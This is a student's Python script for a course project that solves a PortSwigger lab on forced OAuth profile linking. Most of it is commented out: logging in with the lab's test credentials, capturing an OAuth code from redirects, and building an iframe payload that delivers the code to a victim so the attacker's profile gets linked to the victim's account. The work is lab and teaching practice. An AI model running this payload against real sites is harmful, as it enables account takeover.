# Bradley Thompson
# CS595 Winter 2022 Final Project
# https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking
import re

import requests
from bs4 import BeautifulSoup

from Helpers import parseArgsForSite, uploadExploit

site = parseArgsForSite()
s = requests.Session()

if __name__ == "__main__":
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    login_form = soup.find('form')
    button = login_form.find('a', {'class': 'button'})
    print(button)
    # meta = soup.find('meta', {'http-equiv': 'refresh'})
    # print(f'Meta tag is: {meta}')
    #
    # auth_url = meta['content'].split(';')[1].lstrip('url=')
    # print(f'Authorization URL is: {auth_url}')
    # oauth_site = auth_url.split('/')[2]
    # print(f'Identity provider site is: {oauth_site}')
    #
    # resp = s.get(auth_url)
    # soup = BeautifulSoup(resp.text, 'html.parser')
    # login = soup.find('form')
    # login_url = f"https://{oauth_site}{login['action']}"
    # print(f'Sign-in URL is: {login_url}')
    # login_data = {
    #     'username': 'wiener',
    #     'password': 'peter'
    # }
    # resp = s.post(login_url, data=login_data)
    # soup = BeautifulSoup(resp.text, 'html.parser')
    # cont = soup.find('form')
    # cont_url = f"https://{oauth_site}{cont['action']}"
    # print(f'Continue URL is: {cont_url}')
    #
    # resp = s.post(cont_url, allow_redirects=False)
    # redir_url_1 = resp.headers["Location"]
    # print(f'First redirection back to authorization URL: {redir_url_1}')
    # resp = s.get(redir_url_1, allow_redirects=False)
    # redir_url_2 = resp.headers["Location"]
    # print(f'Second redirection back to callback URL of client application containing token: {redir_url_2}')
    # token = re.split('[#&]', redir_url_2)[1].split('=')[1]
    # print(f'Token in oauth-callback is {token}')
    #
    # exploit_payload = f'''
    #     <iframe src="https://{site}/oauth-linking?code={token}"></iframe>
    # '''
    # resp = uploadExploit(s, site, exploit_payload, 'DELIVER_TO_VICTIM')
